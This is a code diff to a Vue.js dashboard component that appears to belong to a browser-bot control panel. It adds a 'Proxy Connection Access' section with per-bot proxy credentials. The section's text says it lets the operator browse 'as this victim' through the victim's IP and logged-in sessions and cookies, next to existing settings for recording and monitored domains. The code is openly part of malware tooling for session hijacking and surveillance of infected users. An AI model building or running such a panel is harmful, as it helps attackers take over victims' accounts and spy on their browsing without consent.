@@ -24,6 +24,22 @@
       ></b-form-textarea>
     </b-input-group>
 
+    <div class="mt-4 p-3 border rounded border-secondary">
+      <h5><font-awesome-icon :icon="['fas', 'key']" /> Proxy Connection Access</h5>
+      <p class="text-muted small">
+        To browse <b>as this victim</b> (using their IP and logged-in Sessions/Cookies), configure your proxy client to connect to <code>SERVER_IP:8080</code> using these credentials.
+      </p>
+      
+      <b-input-group prepend="Username" class="mb-2">
+        <b-form-input v-model="proxy_username" placeholder="Enter username"></b-form-input>
+      </b-input-group>
+
+      <b-input-group prepend="Password">
+        <b-form-input v-model="proxy_password" placeholder="Enter password"></b-form-input>
+      </b-input-group>
+    </div>
+
+
     <hr />
 
     <b-button variant="primary" v-on:click="update_bot_config">
@@ -60,8 +76,15 @@ export default {
         RECORDING_SECONDS: 0,
         MONITOR_DOMAINS: "",
       },
-      
+      globalProxyId: null,
+      proxy_username: "",
+      proxy_password: "",
     };
+  },
+  computed: {
+    isGlobalProxy() {
+      return this.globalProxyId === this.id;
+    },
   },
   mounted() {
     this.fetchData();
@@ -74,8 +97,11 @@ export default {
 
       get_field(this.id, "data_config").then((response) => {
         this.data_config = response;
-        this.data_config.MONITOR_DOMAINS = this.data_config.MONITOR_DOMAINS.join(",");
+        this.data_config.MONITOR_DOMAINS = this.data_config.MONITOR_DOMAINS ? this.data_config.MONITOR_DOMAINS.join(",") : "";
       });
+
+      get_field(this.id, "proxy_username").then(res => this.proxy_username = res);
+      get_field(this.id, "proxy_password").then(res => this.proxy_password = res);
     },
     async update_bot_config() {
       await api_request(
@@ -91,6 +117,8 @@ export default {
             RECORDING_SECONDS: parseInt(this.data_config.RECORDING_SECONDS),
             MONITOR_DOMAINS: this.data_config.MONITOR_DOMAINS.split(","),
           },
+          proxy_username: this.proxy_username,
+          proxy_password: this.proxy_password,
         }
       );
       this.$toastr.s("Bot renamed successfully.");
